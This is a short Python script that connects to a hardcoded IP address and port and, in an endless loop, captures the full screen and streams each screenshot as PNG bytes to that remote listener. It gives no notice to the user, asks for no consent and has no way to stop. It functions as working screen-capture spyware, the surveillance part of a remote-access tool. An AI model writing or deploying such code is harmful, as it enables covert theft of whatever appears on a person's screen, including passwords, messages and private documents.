import socket
from PIL import ImageGrab
from io import BytesIO

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = ('192.168.14.14', 10000)
sock.connect(server_address)

while True:
    screenshot = ImageGrab.grab()

    screenshot_bytes = BytesIO()
    screenshot.save(screenshot_bytes, format="PNG")
    screenshot_bytes = screenshot_bytes.getvalue()

    size = len(screenshot_bytes)
    sock.sendall(size.to_bytes(4, byteorder='big'))
    sock.sendall(screenshot_bytes)

sock.close()
